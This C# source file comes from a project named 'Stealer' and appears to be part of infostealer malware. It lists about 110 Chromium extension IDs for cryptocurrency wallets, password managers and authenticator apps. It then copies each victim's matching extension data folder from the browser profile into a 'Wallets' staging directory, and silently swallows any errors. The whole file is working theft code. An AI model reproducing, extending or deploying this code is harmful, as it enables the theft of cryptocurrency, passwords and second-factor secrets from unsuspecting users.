using System.Collections.Generic;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Crypto.Browsers;

internal class CryptoChromium
{
	private static readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
	{
		new string[2] { "Authenticator", "bhghoamapcdpbohphigoooaddinpkbai" },
		new string[2] { "EOS Authenticator", "oeljdldpnmdbchonielidgobddffflal" },
		new string[2] { "BrowserPass", "naepdomgkenhinolocfifgehidddafch" },
		new string[2] { "MYKI", "bmikpgodpkclnkgmnpphehdgcimmided" },
		new string[2] { "Splikity", "jhfjfclepacoldmjmkmdlmganfaalklb" },
		new string[2] { "CommonKey", "chgfefjpcobfbnpmiokfjjaglahmnded" },
		new string[2] { "Zoho Vault", "igkpcodhieompeloncfnbekccinhapdb" },
		new string[2] { "Norton Password Manager", "admmjipmmciaobhojoghlmleefbicajg" },
		new string[2] { "Avira Password Manager", "caljgklbbfbcjjanaijlacgncafpegll" },
		new string[2] { "Trezor Password Manager", "imloifkgjagghnncjkhggdhalmcnfklk" },
		new string[2] { "MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn" },
		new string[2] { "TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec" },
		new string[2] { "BinanceChain", "fhbohimaelbohpjbbldcngcnapndodjp" },
		new string[2] { "Coin98", "aeachknmefphepccionboohckonoeemg" },
		new string[2] { "iWallet", "kncchdigobghenbbaddojjnnaogfppfj" },
		new string[2] { "Petra", "ejjladinnckdgjemekebdpeokbikhfci" },
		new string[2] { "Pontem", "phkbamefinggmakgklpkljjmgibohnba" },
		new string[2] { "Core", "agoakfejjabomempkjlepdflaleeobhb" },
		new string[2] { "Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa" },
		new string[2] { "Wombat", "amkmjjmmflddogmhpjloimipbofnfjih" },
		new string[2] { "ExodusWeb3", "aholpfdialjgjfhomihkjbmgjidlcdno" },
		new string[2] { "MEW CX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm" },
		new string[2] { "Fewcha", "ebfidpplhabeedpnhjnobghokpiioolj" },
		new string[2] { "Math", "afbcbjpbpfadlkmhmclhkeeodmamcflc" },
		new string[2] { "NeoLine", "cphhlgmgameodnhkjdmkpanlelnlohao" },
		new string[2] { "Terra Station", "aiifbnbfobpmeekipheeijimdpnlpgpp" },
		new string[2] { "Keplr", "dmkamcknogkgcdfhhbddcghachkejeap" },
		new string[2] { "Sollet", "fhmfendgdocmcbmfikdcogofphimnkno" },
		new string[2] { "ICONex", "flpiciilemghbmfalicajoolhkkenfel" },
		new string[2] { "KHC", "hcflpincpppdclinealmandijcmnkbgn" },
		new string[2] { "TezBox", "mnfifefkajgofkcjkemidiaecocnkjeh" },
		new string[2] { "Byone", "nlgbhdfgdhgbiamfdfmbikcdghidoadd" },
		new string[2] { "OneKey", "ilbbpajmiplgpehdikmejfemfklpkmke" },
		new string[2] { "Trust Wallet", "pknlccmneadmjbkollckpblgaaabameg" },
		new string[2] { "Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph" },
		new string[2] { "MetaWallet", "pfknkoocfefiocadajpngdknmkjgakdg" },
		new string[2] { "Guarda Wallet", "fcglfhcjfpkgdppjbglknafgfffkelnm" },
		new string[2] { "Exodus", "idkppnahnmmggbmfkjhiakkbkdpnmnon" },
		new string[2] { "Jaxx Liberty", "mhonjhhcgphdphdjcdoeodfdliikapmj" },
		new string[2] { "Atomic Wallet", "bhmlbgebokamljgnceonbncdofmmkedg" },
		new string[2] { "Electrum", "hieplnfojfccegoloniefimmbfjdgcgp" },
		new string[2] { "Mycelium", "pidhddgciaponoajdngciiemcflpnnbg" },
		new string[2] { "Coinomi", "blbpgcogcoohhngdjafgpoagcilicpjh" },
		new string[2] { "GreenAddress", "gflpckpfdgcagnbdfafmibcmkadnlhpj" },
		new string[2] { "Edge", "doljkehcfhidippihgakcihcmnknlphh" },
		new string[2] { "BRD", "nbokbjkelpmlgflobbohapifnnenbjlh" },
		new string[2] { "Samourai Wallet", "apjdnokplgcjkejimjdfjnhmjlbpgkdi" },
		new string[2] { "Copay-Airbitz", "ieedgmmkpkbiblijbbldefkomatsuahh" },
		new string[2] { "Bread", "jifanbgejlbcmhbbdbnfbfnlmbomjedj" },
		new string[2] { "Martian", "efbglgofoippbgcjepnhiblaibcnclgk" },
		new string[2] { "Sui", "opcgpfmipidbgpenhmajoajpbobppdil" },
		new string[2] { "KeepKey", "dojmlmceifkfgkgeejemfciibjehhdcl" },
		new string[2] { "Trezor", "jpxupxjxheguvfyhfhahqvxvyqthiryh" },
		new string[2] { "Venom", "ojggmchlghnjlapmfbnjholfjkiidbch" },
		new string[2] { "Ledger Live", "pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln" },
		new string[2] { "Ledger Wallet", "hbpfjlflhnmkddbjdchbbifhllgmmhnm" },
		new string[2] { "Bitbox", "ocmfilhakdbncmojmlbagpkjfbmeinbd" },
		new string[2] { "Digital Bitbox", "dbhklojmlkgmpihhdooibnmidfpeaing" },
		new string[2] { "YubiKey", "mammpjaaoinfelloncbbpomjcihbkmmc" },
		new string[2] { "Google Authenticator", "khcodhlfkpmhibicdjjblnkgimdepgnd" },
		new string[2] { "Microsoft Authenticator", "bfbdnbpibgndpjfhonkflpkijfapmomn" },
		new string[2] { "Authy", "gjffdbjndmcafeoehgdldobgjmlepcal" },
		new string[2] { "Duo Mobile", "eidlicjlkaiefdbgmdepmmicpbggmhoj" },
		new string[2] { "OTP Auth", "bobfejfdlhnabgglompioclndjejolch" },
		new string[2] { "FreeOTP", "elokfmmmjbadpgdjmgglocapdckdcpkn" },
		new string[2] { "Aegis Authenticator", "ppdjlkfkedmidmclhakfncpfdmdgmjpm" },
		new string[2] { "LastPass Authenticator", "cfoajccjibkjhbdjnpkbananbejpkkjb" },
		new string[2] { "Dashlane", "flikjlpgnpcjdienoojmgliechmmheek" },
		new string[2] { "Keeper", "gofhklgdnbnpcdigdgkgfobhhghjmmkj" },
		new string[2] { "RoboForm", "hppmchachflomkejbhofobganapojjol" },
		new string[2] { "KeePass", "lbfeahdfdkibininjgejjgpdafeopflb" },
		new string[2] { "KeePassXC", "kgeohlebpjgcfiidfhhdlnnkhefajmca" },
		new string[2] { "Bitwarden", "inljaljiffkdgmlndjkdiepghpolcpki" },
		new string[2] { "NordPass", "njgnlkhcjgmjfnfahdmfkalpjcneebpl" },
		new string[2] { "LastPass", "gabedfkgnbglfbnplfpjddgfnbibkmbb" },
		new string[2] { "Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad" },
		new string[2] { "Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec" },
		new string[2] { "Auvitas", "klfhbdnlcfcaccoakhceodhldjojboga" },
		new string[2] { "Math", "dfeccadlilpndjjohbjdblepmjeahlmm" },
		new string[2] { "Metamask", "ejbalbakoplchlghecdalmeeeajnimhm" },
		new string[2] { "MTV", "oooiblbdpdlecigodndinbpfopomaegl" },
		new string[2] { "Rabet", "aanjhgiamnacdfnlfnmgehjikagdbafd" },
		new string[2] { "Ronin", "bblmcdckkhkhfhhpfcchlpalebmonecp" },
		new string[2] { "Yoroi", "akoiaibnepcedcplijmiamnaigbepmcb" },
		new string[2] { "Zilpay", "fbekallmnjoeggkefjkbebpineneilec" },
		new string[2] { "Terra Station", "ajkhoeiiokighlmdnlakpjfoobnjinie" },
		new string[2] { "Jaxx", "dmdimapfghaakeibppbfeokhgoikeoci" },
		new string[2] { "Tokenpocket", "mfgccjchihfkkindfppnaooecgfneiii" },
		new string[2] { "Safepal", "lgmpcpglpngdoalbgeoldeajfclnhafa" },
		new string[2] { "Solfare", "bhhhlbepdkbapadjdnnojkbgioiodbic" },
		new string[2] { "Kaikas", "jblndlipeogpafnldhgmapagcccfchpi" },
		new string[2] { "Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb" },
		new string[2] { "Guarda", "hpglfhgfnhbgpjdenjgmdgoeiappafln" },
		new string[2] { "Jaxx Liberty", "cjelfplplebdjjenllpjcblmjkfcffne" },
		new string[2] { "Oxygen", "fhilaheimglignddkjgofkcbgekhenbh" },
		new string[2] { "Guild", "nanjmdknhkinifnkgdcggcfnhdaammmj" },
		new string[2] { "Saturn", "nkddgncdjgjfcddamfgcmfnlhccnimig" },
		new string[2] { "HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib" },
		new string[2] { "Ever", "cgeeodpfagjceefieflmdfphplkenlfk" },
		new string[2] { "KardiaChain", "pdadjkfkgcafgbceimcpbkalnfnepbnk" },
		new string[2] { "PaliWallet", "mgffkfbidihjpoaomajlbgchddlicgpn" },
		new string[2] { "BoltX", "aodkkagnadcbobfpggfnjeongemjbjca" },
		new string[2] { "Liquality", "kpfopkelmapcoipemfendmdcghnegimn" },
		new string[2] { "XDEFI", "hmeobnfnfcmdkdcmlblgagmfpfboieaf" },
		new string[2] { "Nami", "lpfcbjknijpeeillifnkikgncikgfhdo" },
		new string[2] { "MaiarDEFI", "dngmlblcodfobpdpecaadgfbcggfjfnm" },
		new string[2] { "TempleTezos", "ookjlbkiijinhpmnjffcofjonbfbgaoc" },
		new string[2] { "XMR.PT", "eigblbgjknlfbajkfhopmcojidlgcehm" }
	};

	public static int GetChromeWallets(string BrowserPath, string BrowserName)
	{
		int num = 0;
		try
		{
			foreach (string[] chromeWalletsDirectory in ChromeWalletsDirectories)
			{
				if (CopyWalletFromDirectoryTo(Path.Combine(BrowserPath, "Local Extension Settings", chromeWalletsDirectory[1]), BrowserName + " " + chromeWalletsDirectory[0]))
				{
					num++;
				}
			}
		}
		catch
		{
		}
		return num;
	}

	private static bool CopyWalletFromDirectoryTo(string sWalletDir, string sWalletName)
	{
		string virtualDir = Path.Combine("Wallets", sWalletName);
		if (!Directory.Exists(sWalletDir))
		{
			return false;
		}
		DynamicFiles.CopyDirectory(sWalletDir, virtualDir);
		return true;
	}
}
